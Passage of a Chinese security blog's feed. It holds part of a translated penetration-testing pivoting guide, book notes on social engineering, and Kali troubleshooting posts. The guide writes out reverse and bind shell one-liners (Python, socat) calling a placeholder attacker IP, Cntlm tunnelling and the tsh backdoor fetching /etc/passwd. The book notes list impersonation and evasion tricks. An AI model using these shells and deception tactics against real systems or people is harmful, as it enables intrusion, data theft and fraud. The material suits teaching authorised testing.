-<h3 id="Cntlm"><a href="#Cntlm" class="headerlink" title="Cntlm"></a>Cntlm</h3><p><a href="http://cntlm.sourceforge.net/" target="_blank" rel="external">Cntlm</a>是通过NTLM代理运行任何非代理感知程序的首选工具。基本上这个工具对一个代理进行身份验证，并将本地端口绑定到你指定的外部服务。这个端口绑定不需要任何认证，所以你可以直接使用你的工具（例如putty/ssh）。它使用配置文件进行操作。这里有一个准系统配置的例子来转发端口443（这个端口是最有可能被允许通过代理的）：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Username Alice</div><div class="line">Password P@ssw0rd</div><div class="line">Domain CONTOSO.COM</div><div class="line">Proxy 10.0.0.10:8080</div><div class="line">Tunnel 2222:&lt;attackers_machine&gt;:443</div></pre></td></tr></table></figure></p>
-<p>运行：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cntlm.exe -c config.conf</div></pre></td></tr></table></figure></p>
-<p>或者如果你在Linux上：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./cntlm -c config.conf</div></pre></td></tr></table></figure></p>
-<p>现在，假设你已经在远程主机的443端口上运行ssh，你可以启动ssh客户端（openssh/putty）并连接到本地端口2222来访问外部机器。</p>
-<h3 id="通过HTTP代理的OpenVpn"><a href="#通过HTTP代理的OpenVpn" class="headerlink" title="通过HTTP代理的OpenVpn"></a>通过HTTP代理的OpenVpn</h3><p><a href="https://openvpn.net/index.php/open-source/documentation/howto.html" target="_blank" rel="external">OpenVpn</a>是巨大的，所以它从头开始的配置超出了这篇文章的范围。只需简单提一下 - 它也支持通过NTLM代理的隧道TCP连接。将此行添加到你的配置文件中：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http-proxy &lt;proxy_ip&gt; 8080 &lt;file_with_creds&gt; ntlm</div></pre></td></tr></table></figure></p>
-<p>凭证文件应该在不同的行上包含用户名和密码。而且，是的，你需要root。</p>
-<h1 id="利用带有proxychains的SOCKS"><a href="#利用带有proxychains的SOCKS" class="headerlink" title="利用带有proxychains的SOCKS"></a>利用带有proxychains的SOCKS</h1><p>如果你的程序不使用原始套接字（例如，nmap syn-scan），那么很可能你可以使用<code>proxychains</code>来强制你的程序通过socks代理。编辑/etc/proxychains.conf中的代理服务器：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">[ProxyList]</div><div class="line"><span class="comment"># add proxy here ...</span></div><div class="line"><span class="comment"># meanwile</span></div><div class="line"><span class="comment"># defaults set to "tor"</span></div><div class="line">socks4  127.0.0.1 3128</div></pre></td></tr></table></figure></p>
-<p>准备好了，只需在你最喜欢的pwn工具上添加<code>proxychains</code>：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">proxychains program_name</div></pre></td></tr></table></figure></p>
-<p>与proxychains一起使用的impacket’s psexec.py：<br><img src="/images/pivoting1.png" alt=""></p>
-<h1 id="DNS与proxychains"><a href="#DNS与proxychains" class="headerlink" title="DNS与proxychains"></a>DNS与proxychains</h1><p>Proxychains在解析主机名时不遵循socks RFC。它拦截<code>gethostbyname</code> libc调用并通过socks代理隧道化tcp DNS请求。事情是，DNS服务器硬编码到<code>4.2.2.2</code>。你可能需要更改名称服务器以解析内部网络上的名称。一个典型的情况是如果你正在测试Windows环境，将名称服务器更改为域控制器。该设置位于<code>/usr/lib/proxychains3/proxyresolv</code>：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/sh</span></div><div class="line"><span class="comment"># This script is called by proxychains to resolve DNS names</span></div><div class="line"></div><div class="line"><span class="comment"># DNS server used to resolve names</span></div><div class="line">DNS_SERVER=<span class="variable">$&#123;PROXYRESOLV_DNS:-4.2.2.2&#125;</span>    <span class="comment">#change nameserver here</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> [ <span class="variable">$#</span> = 0 ] ; <span class="keyword">then</span></div><div class="line">    <span class="built_in">echo</span> <span class="string">"  usage:"</span></div><div class="line">    <span class="built_in">echo</span> <span class="string">"      proxyresolv &lt;hostname&gt; "</span></div><div class="line">    <span class="built_in">exit</span></div><div class="line"><span class="keyword">fi</span></div></pre></td></tr></table></figure></p>
-<h1 id="美化你的web-shell"><a href="#美化你的web-shell" class="headerlink" title="美化你的web shell"></a>美化你的web shell</h1><p>这部分内容与pivoting或tunneling没有直接关系，而是描述了在内部网络发展攻击时简化工作的方法。通常情况下，使用web-shell非常繁琐，特别是在使用需要交互式命令界面的程序时。很可能你会使用一些解决方法来执行简单的任务，比如将密码传递给sudo/su或者只是编辑一个文件。我不是一个折磨自己的狂热爱好者，所以当有一个机会将web-shell升级到一个交互式shell时，我这样做:)我不会介绍像使用bash/perl/python等启动半交互式shell。有很多关于这样做的信息。看看这个反向shell备忘单 - <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="external">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a> 。</p>
-<h2 id="Python-PTY-shell"><a href="#Python-PTY-shell" class="headerlink" title="Python PTY shell"></a>Python PTY shell</h2><p>从常规的半交互式shell升级。你可以在现有的shell中执行以下命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -c <span class="string">'import pty; pty.spawn("/bin/bash")'</span></div></pre></td></tr></table></figure></p>
-<p>或者启动反向连接：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">python -c <span class="string">'import socket,subprocess,os;\</span></div><div class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\</div><div class="line">s.connect(("&lt;attackers_ip&gt;",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);\</div><div class="line">os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'</div></pre></td></tr></table></figure></p>
-<h2 id="Socat"><a href="#Socat" class="headerlink" title="Socat"></a>Socat</h2><p>Netcat的加强版！可是说实话，去检查这个<a href="http://www.dest-unreach.org/socat/" target="_blank" rel="external">工具</a>的手册<code>man socat</code>，你会惊奇你可以用这个工具做隧道化的工作。除此之外，它可以产生一个完全交互的shell，甚至比前面提到的python-pty更好。缺点是你很可能将不得不在目标服务器上编译/安装这个工具，因为它不是大多数类Unix发行版中的默认工具。</p>
-<h3 id="绑定shell"><a href="#绑定shell" class="headerlink" title="绑定shell"></a>绑定shell</h3><p>设置监听器：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane</div></pre></td></tr></table></figure></p>
-<p>连接到监听器：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">socat FILE:`tty`,raw,<span class="built_in">echo</span>=0 TCP:&lt;victim_ip&gt;:1337</div></pre></td></tr></table></figure></p>
-<h3 id="反向shell："><a href="#反向shell：" class="headerlink" title="反向shell："></a>反向shell：</h3><p>设置监听器：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,<span class="built_in">echo</span>=0</div></pre></td></tr></table></figure></p>
-<p>连接到攻击者的机器：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">socat TCP4:&lt;attackers_ip&gt;:1337 EXEC:bash,pty,stderr,setsid,sigint,sane</div></pre></td></tr></table></figure></p>
-<h3 id="终端大小"><a href="#终端大小" class="headerlink" title="终端大小"></a>终端大小</h3><p>默认情况下，终端的大小是相当小的，当启动<code>top</code>命令或使用文本编辑器编辑文件时你可能会注意到。你可以很容易地改变这个，使用<code>stty -a</code>命令来获得你的常规终端的大小：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ stty -a</div><div class="line">speed 38400 baud; rows 57; columns 211; line = 0;</div></pre></td></tr></table></figure></p>
-<p>将所需的尺寸应用到你的socat终端：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ stty rows 57 cols 211</div></pre></td></tr></table></figure></p>
-<h2 id="Tsh"><a href="#Tsh" class="headerlink" title="Tsh"></a>Tsh</h2><p><a href="https://github.com/creaktive/tsh" target="_blank" rel="external">Tsh</a>是一个小型的ssh式后门，带有完整的pty终端，并具有文件传输能力。这个工具的占用空间非常小，并且很容易在大多数类Unix系统上编译。从编辑tsh.h文件开始：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _TSH_H</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> _TSH_H</span></div><div class="line"></div><div class="line"><span class="keyword">char</span> *secret = <span class="string">"never say never say die"</span>;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> SERVER_PORT 22</span></div><div class="line"><span class="keyword">short</span> <span class="keyword">int</span> server_port = SERVER_PORT;</div><div class="line"><span class="comment">/*</span></div><div class="line">#define CONNECT_BACK_HOST  "localhost"</div><div class="line">#define CONNECT_BACK_DELAY 30</div><div class="line">*/</div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> GET_FILE 1</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> PUT_FILE 2</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> RUNSHELL 3</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* tsh.h */</span></span></div></pre></td></tr></table></figure></p>
-<p>更改<code>secret</code>，指定<code>SERVER_PORT</code>。如果你想反向连接，取消注释并编辑<code>CONNECT_BACK_HOST</code>和<code>CONNECT_BACK_DELAY</code>指令。运行make：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">$ make linux_x64</div><div class="line">make								\</div><div class="line">	LDFLAGS=<span class="string">" -Xlinker --no-as-needed -lutil"</span>	\</div><div class="line">	DEFS=<span class="string">" -DLINUX"</span>					\</div><div class="line">	tsh tshd</div><div class="line">make[1]: Entering directory <span class="string">'/tmp/tsh'</span></div><div class="line">gcc -O3 -W -Wall -DLINUX -c pel.c</div><div class="line">gcc -O3 -W -Wall -DLINUX -c aes.c</div><div class="line">gcc -O3 -W -Wall -DLINUX -c sha1.c</div><div class="line">gcc -O3 -W -Wall -DLINUX -c tsh.c</div><div class="line">gcc -Xlinker --no-as-needed -lutil -o tsh pel.o aes.o sha1.o tsh.o</div><div class="line">strip tsh</div><div class="line">gcc -O3 -W -Wall -DLINUX -c tshd.c</div><div class="line">gcc -Xlinker --no-as-needed -lutil -o tshd pel.o aes.o sha1.o tshd.o</div><div class="line">strip tshd</div><div class="line">make[1]: Leaving directory <span class="string">'/tmp/tsh'</span></div></pre></td></tr></table></figure></p>
-<p>现在在服务器上运行<code>./tshd</code>。它将开始监听指定的端口。您可以通过执行以下命令连接到它：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./tsh host_ip</div></pre></td></tr></table></figure></p>
-<p>如果tsh被编译有反向连接功能，<code>tshd</code>守护进程将尝试连接回攻击者的机器。在攻击者侧启动监听：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ ./tsh cb</div><div class="line">Waiting <span class="keyword">for</span> the server to connect...</div></pre></td></tr></table></figure></p>
-<p>用tsh传输文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">./tsh host_ip get /etc/passwd .</div><div class="line">./tsh host_ip put /bin/netcat /tmp</div></pre></td></tr></table></figure></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;本文翻译自&lt;a href=&quot;https://artkond.com/2017/03/23/pivoting-guide/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://artkond.com/2017/03/23/pivoting-guide/&lt;/a&gt; ，正文如下：&lt;/p&gt;
-&lt;p&gt;渗透测试人员经常通过逻辑网络边界来访问客户的关键基础设施。常见的情况包括在成功的外围攻破之后，将攻击发展到内部网络，或者在危及组织内的主机之后访问初始的不可路由的网段。跳板是red team/pentest参与过程中使用的一系列技术，它们利用攻击者控制的主机作为逻辑网络进行跳跃，旨在扩大网络可视性。在这篇文章中，我将介绍常用的跳板技术和可用的工具。&lt;br&gt;
-    
-    </summary>
-    
-      <category term="Translation" scheme="https://howiezhao.github.io/categories/Translation/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>《欺骗的艺术》读书笔记</title>
-    <link href="https://howiezhao.github.io/2017/12/05/the-art-of-deception/"/>
-    <id>https://howiezhao.github.io/2017/12/05/the-art-of-deception/</id>
-    <published>2017-12-04T16:31:08.000Z</published>
-    <updated>2018-04-30T12:32:34.951Z</updated>
-    
-    <content type="html"><![CDATA[<ol>
-<li>人的因素是安全过程中最薄弱的环节。</li>
-<li>你只要说你是一个写书的或者写电影剧本的，每个人都会对你开绿灯。</li>
-<li>把重要的问题掺杂在琐碎的、不合逻辑的问题中间，这样可以给人一种可信的感觉。</li>
-<li>不要在得到关键信息后马上结束谈话。再问两三个问题，闲聊几句，然后才说再见。以后，如果受害者记起你曾经问过什么，则极有可能是最后几个问题，其他的通常都忘掉了。</li>
-<li>两三样信息可能就足以支撑起一次成功的假冒行为 —— 社交工程师冒用别人的身份。取得职员的名字、他的电话，以及他的职员编号 —— 或许，最好也能得到其经理的名字和电话 —— 这样，即使一个半瓶子醋的社交工程师，也有了足够的信息，使自己在给下一个目标打电话时听起来非常可信。<a id="more"></a></li>
-<li>安全培训需要强调一点：当你有疑虑时，必须确认，确认，再确认。</li>
-<li>执法部门的人跟军队里的人一样，从接受训练的第一天起就形成了一个根深蒂固的等级观念。只要社交工程师扮作警官或中尉 —— 级别比跟他谈话的人高 —— 受害者就会拘于一条长时间得来的教训，即“不要质问比你职别高的人”。级别，换个说法，就是特权，尤其是不被级别低的人质问的特权。</li>
-<li>每个人都应该明白社交工程师的伎俩：获得尽可能多的与目标有关的信息，再利用这些信息使人相信自己是内部人员。然后一剑封喉。</li>
-<li>逆向社交工程学：一种社交工程攻击方式。攻击者建立起这样一个场景：让受害者遇到问题，并向攻击者寻求帮助。逆向社交工程学的另一种表现形式是以其人之道还治其人之身。攻击目标识别出自己受到了攻击，从而利用心理学原理来牵制攻击者，并且从他那里引诱出尽可能多的信息，进而有效的保护目标资产。</li>
-<li>新员工最容易成为攻击者的目标。他们认识的人还不多，也不太清楚公司的办事程序，以及什么该做什么不该做。而且，为给人留下良好的第一印象，他们急于表现自己是多么乐于合作与反应迅捷。</li>
-<li>第一条原则：除非万不得已，否则不要造访他们的办公室。仅凭着电话中的声音，他们是很难认出你来的，而如果他们不能人称认出你，那就不能逮捕你。</li>
-</ol>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;ol&gt;
-&lt;li&gt;人的因素是安全过程中最薄弱的环节。&lt;/li&gt;
-&lt;li&gt;你只要说你是一个写书的或者写电影剧本的，每个人都会对你开绿灯。&lt;/li&gt;
-&lt;li&gt;把重要的问题掺杂在琐碎的、不合逻辑的问题中间，这样可以给人一种可信的感觉。&lt;/li&gt;
-&lt;li&gt;不要在得到关键信息后马上结束谈话。再问两三个问题，闲聊几句，然后才说再见。以后，如果受害者记起你曾经问过什么，则极有可能是最后几个问题，其他的通常都忘掉了。&lt;/li&gt;
-&lt;li&gt;两三样信息可能就足以支撑起一次成功的假冒行为 —— 社交工程师冒用别人的身份。取得职员的名字、他的电话，以及他的职员编号 —— 或许，最好也能得到其经理的名字和电话 —— 这样，即使一个半瓶子醋的社交工程师，也有了足够的信息，使自己在给下一个目标打电话时听起来非常可信。
-    
-    </summary>
-    
-      <category term="Notes" scheme="https://howiezhao.github.io/categories/Notes/"/>
-    
-    
-      <category term="社会工程学" scheme="https://howiezhao.github.io/tags/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Kali持久加密USB安装所遇问题总结</title>
-    <link href="https://howiezhao.github.io/2017/12/04/kali-live-usb-bug/"/>
-    <id>https://howiezhao.github.io/2017/12/04/kali-live-usb-bug/</id>
-    <published>2017-12-04T15:54:56.000Z</published>
-    <updated>2017-12-11T08:38:15.642Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="Writing-superblocks-and-filesystem-accounting-information"><a href="#Writing-superblocks-and-filesystem-accounting-information" class="headerlink" title="Writing superblocks and filesystem accounting information"></a>Writing superblocks and filesystem accounting information</h2><p>今天在将Kali安装到U盘上时遇到了上面所示的问题，也可以翻译成“写入超级块和文件系统账户统计信息”，具体情况是当使用<code>mkfs.ext4</code>格式化加密分区时，程序运行到上面所示的地方停止不动，无论等多久都无法完成，其间还会发生U盘挂掉又重连上的情况，使用<code>dmesg</code>命令诊断故障时发现如下错误：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line">device descriptor <span class="built_in">read</span>/8, error -110</div><div class="line">...</div></pre></td></tr></table></figure></p>
-<p>经判断是因为主板无法提供给U盘足够的电量所导致的，因为我的U盘和虚拟机之间是3.0连接的，3.0连接要比2.0连接耗电，所以讲U盘和虚拟机之间的连接改为2.0即可解决这个问题。</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;Writing-superblocks-and-filesystem-accounting-information&quot;&gt;&lt;a href=&quot;#Writing-superblocks-and-filesystem-accounting-information&quot; clas
-    
-    </summary>
-    
-      <category term="Bug" scheme="https://howiezhao.github.io/categories/Bug/"/>
-    
-    
-      <category term="Kali" scheme="https://howiezhao.github.io/tags/Kali/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Metasploit中shell中文乱码解决方案</title>
-    <link href="https://howiezhao.github.io/2017/12/04/metasploit-luanma/"/>
-    <id>https://howiezhao.github.io/2017/12/04/metasploit-luanma/</id>
-    <published>2017-12-04T15:46:32.000Z</published>
-    <updated>2017-12-11T08:42:07.702Z</updated>
-    
-    <content type="html"><![CDATA[<p>有时在Kali Linux中获得了一个Windows shell或者在meterpreter中进入shell后，执行命令可能会出现中文乱码，其原因是Windows和Linux的编码不同，导致Windows中的中文在Linux中无法正常显示。<br><strong>解决方法：</strong></p>
-<ol>
-<li>在shell窗口的工具栏选择“编辑”——&gt;“首选项”——&gt;“编码”，选中简体中文的三个编码：GB18030，GB2312，GBK，打勾并退出</li>
-<li>接着在“终端”——&gt;“设定字符编码”中选择添加的三个简体中文编码之一即可<br><strong>注意：</strong></li>
-<li>这个设置会随着操作系统的重启而失效</li>
-<li>设定简体中文编码之后，Linux中的中文字符就会乱码，因为Linux使用UTF-8编码</li>
-<li>建议只在需要的时候设定简体中文编码</li>
-</ol>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;有时在Kali Linux中获得了一个Windows shell或者在meterpreter中进入shell后，执行命令可能会出现中文乱码，其原因是Windows和Linux的编码不同，导致Windows中的中文在Linux中无法正常显示。&lt;br&gt;&lt;strong&gt;解决方法：
-    
-    </summary>
-    
-      <category term="Bug" scheme="https://howiezhao.github.io/categories/Bug/"/>
-    
-    
-      <category term="Kali" scheme="https://howiezhao.github.io/tags/Kali/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Kali Rolling 2017更新后无法启动解决方案</title>
-    <link href="https://howiezhao.github.io/2017/11/25/kali-update-bug/"/>
-    <id>https://howiezhao.github.io/2017/11/25/kali-update-bug/</id>
-    <published>2017-11-25T11:04:29.000Z</published>
-    <updated>2017-12-11T08:37:59.382Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="BusyBox-v1-27-2-Debian-1-1-27-2-1-built-in-shell-ash"><a href="#BusyBox-v1-27-2-Debian-1-1-27-2-1-built-in-shell-ash" class="headerlink" title="BusyBox v1.27.2 (Debian 1:1.27.2-1) built-in shell (ash)"></a>BusyBox v1.27.2 (Debian 1:1.27.2-1) built-in shell (ash)</h2><p>有时更新Kali后重新启动会出现如下显示，并无法进入系统界面<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">BusyBox v1.27.2 (Debian 1:1.27.2-1) built-in shell (ash)</div><div class="line">Enter <span class="string">'help'</span> <span class="keyword">for</span> a list of built-in commands.</div><div class="line"></div><div class="line">(initramfs)</div></pre></td></tr></table></figure></p>
-<p><strong>解决方法：</strong></p>
-<ol>
-<li>在此界面输入<code>blkid</code>命令，查看自己的分区号</li>
-<li>依据自己的分区号输入<code>fsck -y /dev/sda1</code>，我的分区号是sda1。</li>
-<li>输入<code>exit</code>命令退出重启电脑</li>
-</ol>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;BusyBox-v1-27-2-Debian-1-1-27-2-1-built-in-shell-ash&quot;&gt;&lt;a href=&quot;#BusyBox-v1-27-2-Debian-1-1-27-2-1-built-in-shell-ash&quot; class=&quot;headerl
-    
-    </summary>
-    
-      <category term="Bug" scheme="https://howiezhao.github.io/categories/Bug/"/>
-    
-    
-      <category term="Kali" scheme="https://howiezhao.github.io/tags/Kali/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Kali Rolling 2017下安装w3af出错解决方案</title>
-    <link href="https://howiezhao.github.io/2017/11/08/kali-w3af-bug/"/>
-    <id>https://howiezhao.github.io/2017/11/08/kali-w3af-bug/</id>
-    <published>2017-11-08T03:57:43.000Z</published>
-    <updated>2017-12-11T08:37:43.033Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="Run-error-“‘module’-object-has-no-attribute-‘SSL-ST-INIT’”-”"><a href="#Run-error-“‘module’-object-has-no-attribute-‘SSL-ST-INIT’”-”" class="headerlink" title="Run error: “‘module’ object has no attribute ‘SSL_ST_INIT’”.”"></a>Run error: “‘module’ object has no attribute ‘SSL_ST_INIT’”.”</h2><p><strong>解决方法1：</strong><br>修改/usr/local/lib/python2.7/dist-packages/OpenSSL/SSL.py文件，将下面四行注释掉<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#SSL_ST_INIT = _lib.SSL_ST_INIT</span></div><div class="line"><span class="comment">#SSL_ST_BEFORE = _lib.SSL_ST_BEFORE</span></div><div class="line"><span class="comment">#SSL_ST_OK = _lib.SSL_ST_OK</span></div><div class="line"><span class="comment">#SSL_ST_RENEGOTIATE = _lib.SSL_ST_RENEGOTIATE</span></div></pre></td></tr></table></figure></p>
-<p><strong>解决方法2：</strong></p>
-<ol>
-<li><p>卸载w3af要求的pyOpenSSL版本</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ pip uninstall pyOpenSSL</div></pre></td></tr></table></figure>
-</li>
-<li><p>安装最新版pyOpenSSL</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ pip install pyOpenSSL</div></pre></td></tr></table></figure>
-</li>
-<li><p>编辑w3af安装目录中的/w3af/core/controllers/dependency_check/requirements.py文件，将要求的pyOpenSSl版本号改为你安装的最新版，即修改下面这一行代码</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">PIPDependency(<span class="string">'OpenSSL'</span>, <span class="string">'pyOpenSSL'</span>, <span class="string">'Version of pyOpenSSL you are using'</span>)</div></pre></td></tr></table></figure>
-</li>
-</ol>
-<a id="more"></a>
-<h2 id="error-command-‘x86-64-linux-gnu-g-’-failed-with-exit-status-1"><a href="#error-command-‘x86-64-linux-gnu-g-’-failed-with-exit-status-1" class="headerlink" title="error: command ‘x86_64-linux-gnu-g++’ failed with exit status 1"></a>error: command ‘x86_64-linux-gnu-g++’ failed with exit status 1</h2><p><strong>解决方法：</strong><br>使用如下命令安装相关依赖<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ apt-get build-dep python-lxml</div><div class="line">$ apt-get install libxslt-dev libssl-dev</div></pre></td></tr></table></figure></p>
-<h2 id="ImportError-No-module-named-webkit"><a href="#ImportError-No-module-named-webkit" class="headerlink" title="ImportError: No module named webkit"></a>ImportError: No module named webkit</h2><p>启动GUI界面时可能会报此错误，原因是未安装相关模块<br><strong>解决方法：</strong><br>执行如下命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ apt-get install python-webkit python-webkit-dev</div></pre></td></tr></table></figure></p>
-<p>在Kali下，因为python-webkit，python-webkit-dev不在Kali默认的源中，所以需要执行下面的命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ wget http://ftp.cn.debian.org/debian/pool/main/p/python-support/python-support_1.0.15_all.deb</div><div class="line">$ dpkg -i python-support_1.0.15_all.deb</div><div class="line">$ wget http://ftp.cn.debian.org/debian/pool/main/p/pywebkitgtk/python-webkit_1.1.8-3_amd64.deb</div><div class="line">$ dpkg -i python-webkit_1.1.8-3_amd64.deb</div><div class="line">$ apt install python-gtk2-dev</div><div class="line">$ wget http://ftp.cn.debian.org/debian/pool/main/p/pywebkitgtk/python-webkit-dev_1.1.8-3_all.deb</div><div class="line">$ dpkg -i python-webkit-dev_1.1.8-3_all.deb</div></pre></td></tr></table></figure></p>
-<p>安装过程中可能需要安装相关依赖，可执行如下命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ apt --fix-broken install</div></pre></td></tr></table></figure></p>
-<h2 id="ImportError-No-module-named-gtksourceview2"><a href="#ImportError-No-module-named-gtksourceview2" class="headerlink" title="ImportError: No module named gtksourceview2"></a>ImportError: No module named gtksourceview2</h2><p>同样，启动GUI时也可能报此错误<br><strong>解决方法：</strong><br>执行如下命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ apt-get install python-gtksourceview2</div></pre></td></tr></table></figure></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;Run-error-“‘module’-object-has-no-attribute-‘SSL-ST-INIT’”-”&quot;&gt;&lt;a href=&quot;#Run-error-“‘module’-object-has-no-attribute-‘SSL-ST-INIT’”-”&quot; class=&quot;headerlink&quot; title=&quot;Run error: “‘module’ object has no attribute ‘SSL_ST_INIT’”.”&quot;&gt;&lt;/a&gt;Run error: “‘module’ object has no attribute ‘SSL_ST_INIT’”.”&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;解决方法1：&lt;/strong&gt;&lt;br&gt;修改/usr/local/lib/python2.7/dist-packages/OpenSSL/SSL.py文件，将下面四行注释掉&lt;br&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#SSL_ST_INIT = _lib.SSL_ST_INIT&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#SSL_ST_BEFORE = _lib.SSL_ST_BEFORE&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#SSL_ST_OK = 